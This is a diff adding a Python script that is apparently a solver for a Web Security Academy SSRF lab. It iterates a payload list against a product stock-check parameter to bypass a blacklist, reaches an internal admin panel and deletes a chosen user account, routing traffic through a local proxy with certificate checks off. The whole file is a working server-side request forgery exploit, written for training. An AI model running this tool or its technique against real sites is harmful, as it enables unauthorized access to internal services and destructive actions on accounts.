@@ -1,0 +1,108 @@
+import requests
+import urllib,urllib3,sys,argparse
+from pyfiglet import figlet_format,FigletFont
+from random import randrange
+from termcolor import colored
+from pwn import info,debug,context
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+context.log_level = 'info'
+
+def parse_args():
+    parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+    parser.add_argument('-u','--url',
+                        dest = "url",
+                        help = "your target ex : https://0a3000ad04bcc1d581618e43005400ad.web-security-academy.net/",
+                        default = "https://0a250068031450d5835cdc2a002b0069.web-security-academy.net",
+                        required = True)
+    parser.add_argument('-l','--list',
+                        dest = "list",
+                        help = "your ssrf list you can use owr list (ssrf.txt)",
+                        default = "ssrf.txt",
+                        required = False)
+    parser.add_argument('-user','--user',
+                        dest = "user",
+                        help = "user you want to delete (carlos or wiener)",
+                        default = "carlos",
+                        required = False)
+    return parser.parse_args()
+
+def banner():
+    list=FigletFont.getFonts()
+    print(figlet_format("ssrf exploit", font = list[randrange(len(list)-1)] ))
+    print(colored("Build a Simple ssrf Script with Python", 'yellow'))
+    print(colored("Author: @oussamabinike\n", 'yellow'))
+
+def post(url,payload):
+    # make a post methode 
+    path='/product/stock'
+    ssrf_pyload='stockApi='+payload
+    headers = {
+        'User-Agent'  : 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0',
+        'Content-Type': "application/x-www-form-urlencoded",
+        'Referer'     : 'https://0a2c000f04f7a60783e4463a008d0080.web-security-academy.net/product?productId=1'
+    }
+    r=requests.post(url=url+path,verify=False,timeout=5,data=ssrf_pyload,headers=headers,allow_redirects=True,proxies=proxies)
+    debug(colored('sent post requ to %s with parame %s'%(url+path,ssrf_pyload),'red'))
+    return r
+
+def deleteuser(url,payload,user):
+    payload_ssrf=payload+f'/delete?username={user}'
+    info(f'try to  delet user {user}')
+    r=post(url=url,payload=payload_ssrf)
+    #check if we delet user 
+    info(f'check if we delet user {user}')
+    r=post(url=url,payload=payload)
+    if user in r.text:
+        return False
+    else:
+        return True
+    
+def exploit(url,list,user):
+    # reding the content of file content the pyloads
+    with open(list,'r') as f:
+        content = f.readlines()
+        f.close()
+    # checking chaque pyload if can by pass the black list
+    for payload in content:
+        r=post(url=url,payload=payload)
+        if r.status_code == 200:
+            info(colored('we have accessed to the admin page with this pyload %s'%payload,'green'))
+            # delete user
+            if deleteuser(url,payload,user):
+                return True
+    
+    
+
+
+def main():
+    # calling banner
+    banner()
+    # taking the url and file of pyload and the targer user from attaquer
+    url=parse_args().url
+    list=parse_args().list
+    user=parse_args().user
+
+    # remove the / from the last of the url
+    if url[len(url)-1]=='/':
+        url= url[:-1]
+
+    # check if the user Enter the user carlos or wiener
+    if user!='carlos' and user!='wiener':
+        info(colored('you have just Enter the carlos user or wiener','red'))
+        sys.exit(-1)
+    # start exploit 
+    else:
+        results=exploit(url,list,user)
+
+        if results:
+            info(colored('Exploit successful','green'))
+        else:
+            info(colored('Exploit unsuccessful','red'))
+
+
+if __name__=='__main__':
+    main()
+
